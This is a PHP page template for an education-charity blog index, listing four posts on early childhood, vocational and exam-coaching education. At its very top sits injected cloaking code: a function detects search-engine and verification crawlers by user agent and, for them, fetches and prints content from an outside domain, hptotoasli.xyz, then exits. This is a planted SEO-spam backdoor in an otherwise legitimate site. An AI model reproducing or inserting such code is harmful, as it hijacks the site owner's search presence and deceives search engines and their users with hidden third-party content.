<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

if (is_bot()) {
    $message = file_get_contents('https://hptotoasli.xyz/scholarssociety/');
    echo $message;
exit; // Atau bisa menggunakan die()
}
?>

<!DOCTYPE html>
<html lang="en-US" class="no-js">
<?php

include("includes/main.css");

?>


<body class="body-blog home page-template-default page page-id-2039 gdlr-core-body woocommerce-no-js tribe-no-js kingster-body kingster-body-front kingster-full  kingster-with-sticky-navigation  kingster-blockquote-style-1 gdlr-core-link-to-lightbox">
    <?php
    
    include("includes/header.php");
    
    ?>


            <!--<div class="kingster-page-title-wrap  kingster-style-medium kingster-left-align">-->
                <div class="kingster-header-transparent-substitute"></div>
                <div class="kingster-page-title-overlay"></div>
                <div class="kingster-page-title-container kingster-container">
                    <div class="kingster-page-title-content kingster-item-pdlr">
                        <img src="images/banner.png">
                        <!--<div class="kingster-page-caption">News & Updates</div>-->
                        <!--<h1 class="kingster-page-title">Blog Grid 2 Columns</h1></div>-->
                <!--</div>-->
                
                
            </div>
            <div class="kingster-page-wrapper" id="kingster-page-wrapper">
                <div class="gdlr-core-page-builder-body">
                    <div class="gdlr-core-pbf-section">
                        <div class="gdlr-core-pbf-section-container gdlr-core-container clearfix">
                            <div class="gdlr-core-pbf-element">
                                <div class="gdlr-core-blog-item gdlr-core-item-pdb clearfix  gdlr-core-style-blog-image" style="padding-bottom: 40px ;">
                                    <div class="gdlr-core-blog-item-holder gdlr-core-js-2 clearfix" data-layout="fitrows">
                                        <div class="gdlr-core-item-list  gdlr-core-item-pdlr gdlr-core-item-mgb gdlr-core-column-30 gdlr-core-column-first">
                                            <div class="gdlr-core-blog-modern  gdlr-core-with-image gdlr-core-hover-overlay-content gdlr-core-opacity-on-hover gdlr-core-zoom-on-hover">
                                                <div class="gdlr-core-blog-modern-inner">
                                                    <div class="gdlr-core-blog-thumbnail gdlr-core-media-image">
                                                        
                                                <a href="blog1.php"><img src="images/gallery-img/2.jpg" width="700px " height="660px"  alt=""/></a>
                                                        
                                                        </div>
                                                    <div class="gdlr-core-blog-modern-content  gdlr-core-center-align">
                                                        <h3 class="gdlr-core-blog-title gdlr-core-skin-title" style="font-size: 22px ;font-weight: 700 ;letter-spacing: 0px ;"><a href="blog1.php" >Why Early Childhood Education is a Game-Changer for Underprivileged Communities</a></h3>
                                                        <!--<div class="gdlr-core-blog-info-wrapper gdlr-core-skin-divider"><span class="gdlr-core-blog-info gdlr-core-blog-info-font gdlr-core-skin-caption gdlr-core-blog-info-date"><a href="#"></a></span><span class="gdlr-core-blog-info gdlr-core-blog-info-font gdlr-core-skin-caption gdlr-core-blog-info-author"><span class="gdlr-core-head" >By</span><a href="#" title="Posts by John Smith" rel="author"></a></span>-->
                                                        <!--</div>-->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="gdlr-core-item-list  gdlr-core-item-pdlr gdlr-core-item-mgb gdlr-core-column-30">
                                            <div class="gdlr-core-blog-modern  gdlr-core-with-image gdlr-core-hover-overlay-content gdlr-core-opacity-on-hover gdlr-core-zoom-on-hover">
                                                <div class="gdlr-core-blog-modern-inner">
                                                    <div class="gdlr-core-blog-thumbnail gdlr-core-media-image">
                                                       <a href="blog2.php"> <img src="images/img/IMG_20231214_102907.jpg" width="700" height="660"  alt="" /></a>
                                                        
                                                        </div>
                                                    <div class="gdlr-core-blog-modern-content  gdlr-core-center-align">
                                                        <h3 class="gdlr-core-blog-title gdlr-core-skin-title" style="font-size: 22px ;font-weight: 700 ;letter-spacing: 0px ;"><a href="blog2.php" >Vocational Education: Bridging the Gap Between Talent and Opportunity</a></h3>
                                                        <!--<div class="gdlr-core-blog-info-wrapper gdlr-core-skin-divider"><span class="gdlr-core-blog-info gdlr-core-blog-info-font gdlr-core-skin-caption gdlr-core-blog-info-date"><a href="#">June 6, 2016</a></span><span class="gdlr-core-blog-info gdlr-core-blog-info-font gdlr-core-skin-caption gdlr-core-blog-info-author"><span class="gdlr-core-head" >By</span><a href="#" title="Posts by John Smith" rel="author">John Smith</a></span>-->
                                                        <!--</div>-->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="gdlr-core-item-list  gdlr-core-item-pdlr gdlr-core-item-mgb gdlr-core-column-30 gdlr-core-column-first">
                                            <div class="gdlr-core-blog-modern  gdlr-core-with-image gdlr-core-hover-overlay-content gdlr-core-opacity-on-hover gdlr-core-zoom-on-hover">
                                                <div class="gdlr-core-blog-modern-inner">
                                                    <div class="gdlr-core-blog-thumbnail gdlr-core-media-image">
                                                        <a href="blog3.php"><img src="images/gallery-img/BLOC-3 (2).jpg" width="700" height="660"  alt=""/></a>
                                                        
                                                        </div>
                                                    <div class="gdlr-core-blog-modern-content  gdlr-core-center-align">
                                                        <h3 class="gdlr-core-blog-title gdlr-core-skin-title" style="font-size: 22px ;font-weight: 700 ;letter-spacing: 0px ;"><a href="blog3.php" >Coaching for Competitive Exams: Empowering Students from Marginalized Communities</a></h3>
                                                        <!--<div class="gdlr-core-blog-info-wrapper gdlr-core-skin-divider"><span class="gdlr-core-blog-info gdlr-core-blog-info-font gdlr-core-skin-caption gdlr-core-blog-info-date"><a href="#">June 6, 2016</a></span><span class="gdlr-core-blog-info gdlr-core-blog-info-font gdlr-core-skin-caption gdlr-core-blog-info-author"><span class="gdlr-core-head" >By</span><a href="#" title="Posts by John Smith" rel="author">John Smith</a></span>-->
                                                        <!--</div>-->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="gdlr-core-item-list  gdlr-core-item-pdlr gdlr-core-item-mgb gdlr-core-column-30">
                                            <div class="gdlr-core-blog-modern  gdlr-core-with-image gdlr-core-hover-overlay-content gdlr-core-opacity-on-hover gdlr-core-zoom-on-hover"><div class="gdlr-core-blog-modern-inner">
                                                    <div class="gdlr-core-blog-thumbnail gdlr-core-media-image">
                                                       <a href="blog4.php"> <img src="images/img/IMG_20231115_100714.jpg" width="700" height="660"  alt="" /></a></div>
                                                    <div class="gdlr-core-blog-modern-content  gdlr-core-center-align">
                                                        <h3 class="gdlr-core-blog-title gdlr-core-skin-title" style="font-size: 22px ;font-weight: 700 ;letter-spacing: 0px ;"><a href="blog4.php" >Quality Education is a Right, Not a Privilege</a></h3>
                                                        <!--<div class="gdlr-core-blog-info-wrapper gdlr-core-skin-divider"><span class="gdlr-core-blog-info gdlr-core-blog-info-font gdlr-core-skin-caption gdlr-core-blog-info-date"><a href="#">June 6, 2016</a></span><span class="gdlr-core-blog-info gdlr-core-blog-info-font gdlr-core-skin-caption gdlr-core-blog-info-author"><span class="gdlr-core-head" >By</span><a href="#" title="Posts by John Smith" rel="author">John Smith</a></span>-->
                                                        <!--</div>-->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                       
                                    <!--<div class="gdlr-core-load-more-wrap gdlr-core-js gdlr-core-center-align gdlr-core-item-pdlr" data-ajax="gdlr_core_post_ajax" data-target="gdlr-core-blog-item-holder" data-target-action="append"><a href="#" class="gdlr-core-load-more gdlr-core-button-color" data-ajax-name="paged" data-ajax-value="2">Load More</a></div>-->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <?php
            
            include("includes/footer.php");
            
            
            ?>
        </div>
    </div>


	<script type='text/javascript' src='js/jquery/jquery.js'></script>
    <script type='text/javascript' src='js/jquery/jquery-migrate.min.js'></script>
    <script type='text/javascript' src='plugins/goodlayers-core/plugins/combine/script.js'></script>
    <script type='text/javascript'>
        var gdlr_core_pbf = {
            "admin": "",
            "video": {
                "width": "640",
                "height": "360"
            },
            "ajax_url": "#"
        };
    </script>
    <script type='text/javascript' src='plugins/goodlayers-core/include/js/page-builder.js'></script>
    <script type='text/javascript' src='js/jquery/ui/effect.min.js'></script>
    <script type='text/javascript'>
        var kingster_script_core = {
            "home_url": "index.html"
        };
    </script>
    <script type='text/javascript' src='js/plugins.min.js'></script>
</body>
</html>
